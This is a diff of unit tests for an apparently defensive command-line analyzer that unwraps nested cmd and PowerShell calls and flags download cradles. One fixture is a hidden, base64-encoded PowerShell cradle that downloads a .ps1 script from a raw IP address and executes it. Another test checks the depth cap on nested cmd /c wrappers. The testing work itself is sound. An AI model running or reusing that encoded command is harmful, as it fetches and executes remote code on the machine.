@@ -23,3 +23,22 @@ describe('analyze() sees the launcher/wrapper prefix (not just the -Command body
     expect(r.signals.map((s) => s.id)).toContain('download-cradle')
   })
 })
+
+describe('nested interpreter re-entry (§2.1)', () => {
+  it('cmd /c powershell -w hidden -enc <b64> decodes the inner blob and matches the top-level PS result', async () => {
+    const enc = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
+    const wrapped = await analyze('cmd /c powershell -w hidden -enc ' + enc)
+    const topLevel = await analyze('powershell -w hidden -enc ' + enc)
+    expect(wrapped.signals.map((s) => s.id).sort()).toEqual(topLevel.signals.map((s) => s.id).sort())
+    expect(wrapped.iocs.map((i) => i.raw).sort()).toEqual(topLevel.iocs.map((i) => i.raw).sort())
+    expect(wrapped.layers.some((l) => l.transform.includes('cmd→powershell'))).toBe(true)
+  })
+
+  it('a pathological wrapper-in-wrapper terminates at the depth cap instead of spinning', async () => {
+    const deep = 'cmd /c cmd /c cmd /c cmd /c cmd /c cmd /c cmd /c cmd /c whoami'
+    const r = await analyze(deep)
+    const cmdHops = r.layers.filter((l) => l.transform.includes('cmd→cmd'))
+    expect(cmdHops.length).toBe(4) // NESTED_REENTRY_MAX_DEPTH
+    expect(r.layers[r.layers.length - 1].text).toContain('cmd /c') // did NOT fully unwrap — the cap stopped it
+  })
+})
